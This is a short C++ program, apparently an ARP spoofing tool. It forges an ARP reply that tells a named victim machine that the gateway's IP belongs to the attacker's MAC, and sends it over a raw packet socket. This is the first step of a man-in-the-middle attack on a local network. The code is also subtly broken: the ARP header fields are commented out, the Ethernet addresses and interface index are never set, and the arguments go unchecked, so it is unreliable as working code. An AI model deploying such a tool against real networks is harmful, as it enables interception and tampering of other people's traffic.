#include <iostream>
#include <sstream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>
#include <netpacket/packet.h>

int main(int argc, char* argv[]) 
{
    std::string victimMac = argv[1];
    std::string victimIp = argv[2];
    std::string gatewayMac = argv[3];
    std::string gatewayIp = argv[4];
    std::string localMac = argv[5];

    struct ethhdr ethHeader;
    struct ether_arp arpHeader;
    struct sockaddr_ll sa;
    std::memset(&ethHeader, 0, sizeof(ethHeader));
    std::memset(&arpHeader, 0, sizeof(arpHeader));
    std::memset(&sa, 0, sizeof(sa));

    // eth header
    ethHeader.h_proto = htons(ETH_P_ARP);

    // arp header
    /*arpHeader.ar_hrd = htons(ARPHRD_ETHER);
    arpHeader.ar_pro = htons(ETH_P_IP);
    arpHeader.ar_hln = 6;
    arpHeader.ar_pln = 4;
    arpHeader.ar_op = htons(ARPOP_REPLY);*/

    // Build packet for victim
    sscanf(localMac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &arpHeader.arp_sha[0], &arpHeader.arp_sha[1], &arpHeader.arp_sha[2],
           &arpHeader.arp_sha[3], &arpHeader.arp_sha[4], &arpHeader.arp_sha[5]);
    sscanf(victimMac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &arpHeader.arp_tha[0], &arpHeader.arp_tha[1], &arpHeader.arp_tha[2],
           &arpHeader.arp_tha[3], &arpHeader.arp_tha[4], &arpHeader.arp_tha[5]);

    inet_pton(AF_INET, gatewayIp.c_str(), &arpHeader.arp_spa);
    inet_pton(AF_INET, victimIp.c_str(), &arpHeader.arp_tpa);

    char buffer[sizeof(ethHeader) + sizeof(arpHeader)];
    std::memcpy(buffer, &ethHeader, sizeof(ethHeader));
    std::memcpy(buffer + sizeof(ethHeader), &arpHeader, sizeof(arpHeader));

    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = 0;

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
        std::cerr << "Failed to send ARP packet" << std::endl;
    } else {
        std::cout << "ARP packet sent successfully" << std::endl;
    }

    close(sockfd);

    return 0;
}
